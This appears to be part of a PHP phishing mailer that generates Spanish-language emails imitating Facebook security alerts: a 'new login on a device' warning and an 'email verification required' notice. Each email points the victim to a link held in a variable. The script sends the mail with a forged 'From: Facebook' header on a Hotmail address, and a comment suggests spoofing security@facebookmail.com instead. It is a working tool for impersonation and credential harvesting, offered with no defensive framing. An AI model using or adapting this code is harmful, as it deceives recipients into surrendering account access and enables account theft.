<?php
    ...
    if($tipo  == 1)//Inicio de sesion en un nuevo dispositivo
    {
    	$mensaje =" 
				<!DOCTYPE html>
			<html lang='en'>
			...
			<div type='button' class='_at_6 o365button' aria-labelledby='_ariaId_554'>
				<img src='".$imagen."' style='border:0; max-width:54px; max-height:54px' ><span class='_fc_3 owaimg' style='display:none;'> </span><span class='_fc_4 o365buttonLabel' id='_ariaId_554' style='display: none;'></span>
			</div></div></td>
			...
			Se inicio sesion en tu cuenta de Facebook ".$hora." (UTC-05).&nbsp;</td>
			</tr>
			<tr>
			<td style='font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px'>
			...
			<td style='padding-left:10px'>187.170.205.187</td>
			</tr>
			<tr style=''>
			...
			<tr>
			<td style='font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px'>
			<strong>Si no hiciste esto,</strong> <a href='."$link".' target='_blank' style='color:#3b5998; text-decoration:none'>protege tu cuenta</a>.</td>
			</tr>
			<tr>
			<td style='font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px'>
			</td>
			...
			Este mensaje se envió a <a href='mailto:".$email."' target='_blank' style='color:#3b5998; text-decoration:none'>".$email."</a>. Si no quieres recibir estos mensajes de Facebook en el futuro, <a href='https://www.facebook.com/o.php?k=AS014ETGIQSwG6q7&amp;u=100001365251992&amp;mid=54cebf489832bG5af361da5798G54cec3e1f85fdG18e' target='_blank' style='color:#3b5998; text-decoration:none'>cancela tu suscripción</a>.<br>
    	...
    	if($tipo == 2)
    	{
			...
			<tr>
			<td height='1' colspan='3' style='line-height:1px'><span style='color:#FFFFFF; display:none!important; font-size:1px'>&nbsp; Hola,".$nombre.": Se requiere verificar el tu correo electronico </span></td>
			</tr>
			<tr>
			<td width='15' style='display:block; width:15px'>&nbsp;&nbsp;&nbsp;</td>
			<td style=''>
			...
			<td valign='top' style='padding-right:10px; font-size:0px'><div style='display: inline-block;'>
			<div type='button' class='_at_6 o365button' aria-labelledby='_ariaId_554'>
				<img src=".$imagen." style='border:0; max-width:65px; max-height:70px' ><span class='_fc_3 owaimg' style='display:none;'> </span><span class='_fc_4 o365buttonLabel' id='_ariaId_554' style='display: none;'></span>
			</div></div></td>
			<td valign='top' style='width:100%'>
			<table border='0' cellspacing='0' cellpadding='0' style='border-collapse:collapse; font-size:14px; color:#3D4452; width:100%'>
			<tbody>
			...
			<tr>
			<td style='font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px'>
			<strong>Protege tu cuenta</strong> <a href=".$link." target='_blank' style='color:#3b5998; text-decoration:none'>Verificar</a>.</td>
			</tr>
			<tr>
			<td style='font-size:14px; font-family:LucidaGrande,tahoma,verdana,arial,sans-serif; color:#3D4452; padding-top:6px; padding-bottom:6px'>
			</td>
	...
	$cabeceras .='From: Facebook <capricornio_sol1@hotmail.com>'."\r\n";
	$cabeceras .='Reply-To: capricornio_sol1@hotmail.com'; 

	//otra forma de poner la cabecera es 
	//$cabeceras .='From: Ivan Juarez <security@facebookmail.com>';

	if(mail($para, $titulo, $mensaje, $cabeceras)){

		echo "Mensaje enviado con exito a: ".$email."\n Hora: ".$hora;
	} 
	else
	{
